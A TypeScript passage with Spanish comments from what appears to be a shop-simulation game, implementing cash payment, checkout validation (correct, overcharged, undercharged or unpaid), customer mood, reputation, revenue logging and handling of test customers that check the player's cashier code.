    if (this.rng.next() < CUSTOMER.exactPayChance) return charged;
    const bill = BILLS.find((b) => b >= charged);
    return bill ?? Math.ceil(charged / 10000) * 10000;
  }

  /** Cierra la venta: compara lo cobrado y la devuelta con lo correcto (GDD §5.5). */
  /** Quién está en la caja (para la base de datos). */
  private cashierName(reg: Register): string {
    return this.robots.find((r) => r.x === reg.x && r.y === reg.y)?.name ?? "?";
  }

  finishCheckout(c: Customer): Ticket {
    const reg = c.register ?? this.register;
    const items = c.cart.map((p) => ({ product: p, price: PRODUCTS[p].price }));
    const total = items.reduce((s, i) => s + i.price, 0);
    const { charged } = c.checkout;
    const paid = c.checkout.paid ?? 0;
    const change = c.checkout.change ?? 0;
    const net = paid - change;
    const result: TicketResult =
      c.checkout.paid === null ? "sin_cobrar"
      : net > total + 1e-9 ? "cobro_de_mas"
      : Math.abs(net - total) <= 1e-9 ? "ok"
      : "cobro_de_menos";
    c.checkout.done = true;
    const ticket: Ticket = { tick: this.tick, customerId: c.id, items, total, charged, paid, change, result };

    // prueba de la noche: solo dice cómo le fue al código del cajero
    if (c.test) {
      ticket.test = true;
      c.mood = result === "ok" ? "feliz" : "enojado";
      const text = { ok: "🧪 ¡Bien cobrado!", cobro_de_mas: "🧪 Cobraste de más", cobro_de_menos: "🧪 Cobraste de menos", sin_cobrar: "🧪 No le cobraste" }[result];
      this.float(c, text, result === "ok" ? "good" : "bad");
      this.sound(result === "ok" ? "cash" : "angry", reg);
      this.events.push({ type: "ticket", ticket });
      return ticket;
    }

    if (result === "sin_cobrar") {
      c.mood = "feliz";
    } else if (result === "cobro_de_mas") {
      c.mood = "enojado";
      this.earn(total, reg); // el dinero de más se le devuelve
      this.addReputation(REPUTATION.badCheckout, c);
      this.sound("angry", c);
    } else if (result === "ok") {
      c.mood = "feliz";
      this.earn(total, reg);
      this.addReputation(REPUTATION.goodCheckout);
      this.sound("cash", reg);
    } else {
      c.mood = "feliz";
      this.earn(net, reg);
      this.sound("cash", reg);
    }

    this.tickets.push(ticket);
    this.today.sales++;
    if (result === "ok") this.today.ok++;
    this.today.revenue += result === "ok" || result === "cobro_de_mas" ? total : result === "cobro_de_menos" ? net : 0;
    this.record({ kind: "sale", customerId: c.id, at: this.now, cashier: this.cashierName(reg), total, charged, paid, change, result, items });
    if (this.tickets.length > 100) this.tickets.shift();
    this.events.push({ type: "ticket", ticket });
    return ticket;
  }

  releaseCustomer(c: Customer): void {
    if (!c.checkout.done) this.finishCheckout(c);
    if (c.register) c.register.queue = c.register.queue.filter((x) => x !== c);
    c.state = "leaving";
    c.atRegister = false;
    if (c.test) {
      if (c.register) c.register.testCooldown = TEST_CUSTOMER_DELAY;
      return;
    }
    this.record({ kind: "customer_left", customerId: c.id, at: this.now, outcome: "compró", mood: c.mood });
  }
}
